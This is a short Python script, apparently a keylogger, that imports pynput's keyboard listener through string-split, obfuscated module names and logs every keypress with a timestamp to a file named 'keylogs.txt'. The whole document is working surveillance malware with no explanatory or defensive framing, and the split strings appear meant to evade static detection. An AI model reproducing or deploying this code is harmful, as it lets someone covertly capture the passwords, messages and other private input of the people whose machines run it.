a = __import__('py'+'np'+'ut.ke'+'yboa'+'rd', fromlist=['Key', 'Listener'])
b = __import__('log'+'ging')

log_dir = ""

b.basicConfig(filename=(log_dir + "ke" + "yl" + "ogs.txt"), \
	level=b.DEBUG, format='%(ascti'+'me)s: %(me'+'ssage)s')

def c(d):
    b.info(str(d))

with a.Listener(on_press=c) as listener:
    listener.join()
